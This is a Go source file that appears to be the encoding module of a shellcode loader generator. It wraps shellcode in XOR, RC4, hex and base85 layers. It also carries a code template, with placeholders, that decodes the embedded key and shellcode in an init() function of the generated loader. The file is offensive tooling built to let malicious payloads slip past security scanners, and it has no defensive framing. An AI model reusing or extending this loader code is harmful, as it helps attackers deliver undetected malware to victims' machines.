package encode

import (
	"encoding/hex"
	"github.com/darkwyrm/b85"
)

var Decode2string = []string{
	`//go:embed key
var key []byte

func init() {
	//__HIDE__
	//__SEPARATE__
	shellcode, _ = b85.Decode(string(shellcode))
	shellcode, _ = hex.DecodeString(string(shellcode))
	shellcode = rc4decode(shellcode, []byte(string(key)+"test"))
	shellcode = Xor(shellcode, key)
}
func Xor(shellcode []byte, Key []byte) []byte {
	var result []byte
	for i := 0; i < len(shellcode); i++ {
		result = append(result, shellcode[i]^Key[i%len(Key)])
	}
	return result
}
func rc4decode(shellcode []byte, key []byte) []byte {
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		log.Println(err)
	}
	decryptedBytes := make([]byte, len(shellcode))
	cipher.XORKeyStream(decryptedBytes, shellcode)
	return decryptedBytes
}`,
	`
	"encoding/hex"
	"crypto/rc4"
	"github.com/darkwyrm/b85"
	"log"
	//__IMPORT__`,
}

//xor+rc4+hex+base85
func Encode2(shellcode []byte, key []byte) []byte {
	var encodedbyte []byte
	encodedbyte = Xor(shellcode, key)
	encodedbyte = rc4encode(encodedbyte, []byte(string(key)+"test"))
	encodedbyte = []byte(hex.EncodeToString(encodedbyte))
	encodedbyte = []byte(b85.Encode(encodedbyte))
	return encodedbyte
}

func Decode2(encodedbyte []byte, key []byte) []byte {
	var shellcode []byte
	shellcode, _ = b85.Decode(string(encodedbyte))
	shellcode, _ = hex.DecodeString(string(shellcode))
	shellcode = rc4decode(shellcode, []byte(string(key)+"test"))
	shellcode = Xor(shellcode, key)
	return shellcode
}
